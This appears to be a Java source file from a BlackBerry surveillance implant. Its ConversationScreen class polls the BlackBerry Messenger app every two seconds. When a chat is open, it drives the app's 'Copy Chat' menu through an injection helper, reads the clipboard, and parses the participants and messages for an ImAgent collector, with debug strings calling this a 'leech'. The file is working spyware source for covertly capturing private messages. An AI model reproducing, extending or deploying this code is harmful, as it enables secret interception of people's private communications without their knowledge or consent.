package blackberry.agent.im;

import java.util.Vector;

import net.rim.device.api.system.Backlight;
import net.rim.device.api.system.Clipboard;
import net.rim.device.api.ui.Screen;
import net.rim.device.api.ui.UiApplication;
import blackberry.agent.ImAgent;
import blackberry.debug.Debug;
import blackberry.debug.DebugLevel;
import blackberry.injection.MenuWalker;
import blackberry.utils.Utils;

public class ConversationScreen implements Runnable {
    private static Debug debug = new Debug("ConvScreen", DebugLevel.VERBOSE);

    private UiApplication bbmApplication;
    private Vector conversationScreens = new Vector();

    public void setBBM(UiApplication bbmApplication) {
        this.bbmApplication = bbmApplication;
        //this.conversationScreens=conversationScreens;

        debug.info("conversation Leech: " + conversationScreens);
    }

    public void run() {
        for (;;) {
            Utils.sleep(2000);
            debug.trace("run");

            if (bbmApplication == null || !Backlight.isEnabled()) {
                debug.ledStart(Debug.COLOR_RED);
                continue;
            }

            Screen screen = bbmApplication.getActiveScreen();

            debug.info("leech active screen: " + screen);

            if (screen.getClass().getName().indexOf("BBMConversationScreen") >= 0
                    && bbmApplication.isForeground()) {
                if (!conversationScreens.contains(screen)) {
                    debug.info("Added new conversation screen: " + screen);
                    conversationScreens.addElement(screen);
                    // exploreField(screen, 0, new String[0]);
                }

                String conversation = extractConversation(screen);
                parseConversation(conversation);

                debug.ledStart(Debug.COLOR_YELLOW);
            }
            if (screen.getClass().getName().indexOf("BBMUserInfoScreen") >= 0) {

                if (Backlight.isEnabled()) {

                    //FieldExplorer explorer = new FieldExplorer();
                    //Vector textfields = explorer.explore(screen, true);
                }
            }
        }
    }

    private String extractConversation(Screen screen) {

        debug.trace("extractConversation");

        // debug.trace("try copy chat: "+screen);
        if (MenuWalker.walk("Copy Chat", screen, true)) {
            String clip = (String) Clipboard.getClipboard().get();
            debug.info("Clip: "
                    + clip.substring(0, Math.min(100, clip.length())));
            return clip;
        } else {
            debug.info("NO Conversation screen!");
            return null;
        }
    }

    private void parseConversation(String conversation) {
        // Participants:
        // -------------
        // Torcione, Whiteberry
        //
        // Messages:
        // ---------
        // Torcione: Scrivo anche a he

        int pos = conversation.indexOf("-------------");
        String partecipant1, partecipant2, partecipants;
        int posStart = conversation.indexOf("\n", pos) + 1;
        int posSep = conversation.indexOf(", ", posStart);
        int posEnd = conversation.indexOf("\n", posSep);

        partecipants = conversation.substring(posStart, posEnd);

        partecipant1 = conversation.substring(posStart, posSep);
        debug.trace("partecipant 1: " + partecipant1);
        partecipant2 = conversation.substring(posSep + 2, posEnd);
        debug.trace("partecipant 2: " + partecipant2);

        int posMessages = getLinePos(conversation, 6);
        int numLine = 1;

        Vector lines = new Vector();

        while (true) {
            String currentLine = getNextLine(conversation, posMessages);
            if (currentLine == null) {
                break;
            }
            posMessages += currentLine.length() + 1;

            posSep = currentLine.indexOf(":");
            String user = currentLine.substring(0, posSep);
            String message = currentLine.substring(posSep + 2);

            if (numLine < 5)
                debug.trace("line " + numLine + " user: " + user + " message: "
                        + message);
            numLine += 1;

            Line line = new Line(user, message);
            //#ifdef DEBUG
            debug.trace("parseConversation adding line: " + line);
            //#endif
            lines.addElement(line);

        }

        ImAgent agent = ImAgent.getInstance();

        agent.add(partecipants, lines);
        debug.info("num lines: " + numLine);
    }

    private String getNextLine(String conversation, int posMessages) {

        int endLinePos = conversation.indexOf("\n", posMessages);
        if (endLinePos > 0) {
            return conversation.substring(posMessages, endLinePos);
        } else {
            return null;
        }
    }

    private int getLinePos(String conversation, int numLine) {
        int nextLine = 0;
        for (int i = 0; i < numLine; i++) {
            nextLine = conversation.indexOf("\n", nextLine) + 1;
        }
        return nextLine;
    }

    public int size() {

        return conversationScreens.size();
    }

    public Screen elementAt(int i) {
        return (Screen) conversationScreens.elementAt(i);
    }

}
